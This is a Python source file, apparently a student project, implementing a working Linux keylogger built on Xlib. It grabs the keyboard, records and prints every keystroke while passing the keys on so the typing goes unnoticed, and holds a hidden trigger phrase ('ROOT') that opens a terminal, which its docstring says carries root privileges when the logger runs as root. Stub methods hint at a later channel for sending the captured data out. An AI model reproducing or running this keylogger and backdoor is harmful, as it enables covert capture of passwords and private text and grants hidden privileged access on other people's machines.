from Xlib.display import Display
import Xlib
from Xlib import X
import Xlib.XK
import time
import threading
import subprocess

"""
Since different operating systems require different libraries to capture the keystrokes
properly different keylogger implementations need to be created. This file contains an
implementation that will run on linux based machines.
"""

__author__ = "Nathaniel Cotton"
__email__ = "nec2887@rit.edu"


class LinuxKeyLogger(threading.Thread):
    """
    This implementation of the keylogger is designed to work on linux based
    systems. WILL NOT FUNCTION ON OTHER OPERATING SYSTEMS.
    """
    def __init__(self):
        super().__init__()
        self.display = Display()
        self.root = self.display.screen().root
        self.capturedKeys = []
        self.capture = True

    def handleEvent(self, event):
        """
        The Xlib library will produce events when a key is pressed this method
        will analyze those events and extract the pertainent information along
        with passing that information further down the line to be processed by
        the operating system.
        :param event:
        :return: None
        """
        print(event)
        if (event.type == X.KeyRelease):
            char = Xlib.XK.keysym_to_string(self.display.keycode_to_keysym(event.detail, event.state))
            if char is not None:
                self.capturedKeys.append(char)
                print(char)
            self.phrase_check()
            # self.send_keyup(event.detail, event.state)
            self.send_key(event.detail, event.state)
        elif (event.type == X.KeyPress):
            pass
            # try:
            #     self.send_keydown(event.detail, event.status)
            # except AttributeError as ae:
            #     print(ae)
            # window = self.display.get_input_focus()._data["focus"]
            # window.send_event(event,propagate=True)

    def phrase_check(self):
        """
        TODO MOVE THIS TO A DIFFERENT AREA

        This method will check to see if the typed in keys correspond to any
        of the preset phrases that have associated executions.
        :return:
        """
        # will need to create a smarter way of doing this
        stop = self.checkPhrase(self.getStopPhrase())
        if (stop):
            self.capture = False
        openT = self.checkPhrase(self.getTerminalPhrase())
        if (openT):
            self.openterminal()

    def checkPhrase(self, phrase):
        """
        Checks whether a phrase matches the most recently
        typed in keys.
        """
        length = len(phrase)
        capLength = len(self.capturedKeys)
        if (capLength >= length):
            section = self.capturedKeys[capLength - length:capLength]
            lastWords = ''.join(section)
            if (lastWords.upper() == phrase):
                return True
        return False

    def send_key(self, emulated_key, state):
        """Sends a key downstream to be processed by the computer"""
        self.send_keydown(emulated_key, state)
        self.send_keyup(emulated_key, state)

    def send_keyup(self, emulated_key, state):
        """Sends an key up message downstream to be processed by the computer"""
        shift_mask = state  # Xlib.X.ShiftMask
        window = self.display.get_input_focus()._data["focus"]
        event = Xlib.protocol.event.KeyRelease(
            time=int(time.time()),
            root=self.display.screen().root,
            window=window,
            same_screen=0, child=Xlib.X.NONE,
            root_x=0, root_y=0, event_x=0, event_y=0,
            state=shift_mask,
            detail=emulated_key
        )
        window.send_event(event, propagate=True)

    def send_keydown(self, emulated_key, state):
        """Sends a key down message downstream to be processed by the computer"""
        shift_mask = state  # Xlib.X.ShiftMask
        window = self.display.get_input_focus()._data["focus"]
        event = Xlib.protocol.event.KeyPress(
            time=int(time.time()),
            root=self.root,
            window=window,
            same_screen=0, child=Xlib.X.NONE,
            root_x=0, root_y=0, event_x=0, event_y=0,
            state=shift_mask,
            detail=emulated_key
        )
        window.send_event(event, propagate=True)

    def log(self):
        """Sets up the root window to capture the keys being typed in."""
        self.root.change_attributes(event_mask=X.KeyPressMask | X.KeyReleaseMask)
        self.root.grab_keyboard(0, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime)

        try:
            while self.capture:
                event = self.display.next_event()
                self.handleEvent(event)
                self.display.allow_events(X.AsyncKeyboard, X.CurrentTime)
        except Exception as e:
            print(e)
        print(self.capturedKeys)

    def openterminal(self):
        """
        This method will open up a terminal on a linux machine. If this application
        is running with root privileges then the terminal will also be given root
        privileges.
        :return:
        """
        subprocess.call("gnome-terminal")

    def run(self):
        """Starts the logging process"""
        self.log()

    def getStopPhrase(self):
        """When this phrase is typed in the keylogging will stop"""
        return "MISCHIEF MANAGED"

    def getTerminalPhrase(self):
        """When this phrase is typed in a terminal will be created"""
        return "ROOT"

    def hasInfoToSend(self):
        return False

    def getInfo(self):
        return ''


if __name__ == '__main__':
    keyL = LinuxKeyLogger()
    # keyL.setDaemon(True)
    keyL.start()
